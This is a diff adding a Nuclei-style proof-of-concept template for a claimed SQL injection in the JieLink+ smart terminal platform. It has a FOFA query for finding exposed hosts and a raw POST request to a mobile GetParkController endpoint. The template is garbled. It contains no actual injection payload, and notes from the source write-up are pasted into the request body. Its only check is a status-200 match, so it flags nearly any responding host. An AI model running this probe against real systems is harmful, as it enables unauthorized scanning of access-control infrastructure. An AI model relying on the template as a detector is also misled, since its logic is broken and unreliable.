@@ -1,0 +1,57 @@
+id: poc-ue5yygx0u8gnd5iv
+info:
+  name: JieLink+智能终端操作平台 SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ue5yygx0u8gnd5iv'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ue5yygx0u8gnd5iv
+    fofa: title=="JieLink+智能终端操作平台"
+http:
+- raw:
+  - 'POST /mobile/Remote/GetParkController HTTP/1.1
+
+
+    Accept: application/json, text/plain
+
+
+    X-Requested-With: XMLHttpRequest
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    Connection: close
+
+
+
+
+    deviceId=1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
